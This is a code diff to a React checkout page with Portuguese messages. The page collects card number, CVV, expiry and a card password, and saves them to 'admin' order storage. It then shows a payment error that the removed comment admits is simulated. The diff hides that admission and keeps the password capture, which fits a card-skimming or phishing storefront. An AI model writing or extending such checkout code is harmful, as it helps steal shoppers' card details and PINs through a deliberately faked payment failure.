@@ -11,6 +11,10 @@ import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
 import { sendTictoWebhookV2 } from "@/utils/tictoWebhookV2";
 import { useNavigate } from "react-router-dom";
 
+interface CreditCardDataWithPassword extends CreditCardData {
+  password?: string;
+}
+
 export default function Checkout() {
   const { items, total, clearCart } = useCart();
   const { toast } = useToast();
@@ -28,12 +32,11 @@ export default function Checkout() {
     zipCode: "",
   });
 
-  const [creditCardData, setCreditCardData] = useState({
+  const [creditCardData, setCreditCardData] = useState<CreditCardDataWithPassword>({
     cardNumber: "",
     cardHolder: "",
     expiryDate: "",
     cvv: "",
-    password: "",
   });
 
   const saveOrderToAdmin = (cardPassword?: string) => {
@@ -54,7 +57,6 @@ export default function Checkout() {
     const existingOrders = getFromLocalStorage('orders', []);
     saveToLocalStorage('orders', [...existingOrders, orderData]);
 
-    // Simular erro de processamento do cartão
     toast({
       title: "Erro no processamento do pagamento",
       description: "Erro no processamento do pagamento com cartão de crédito",
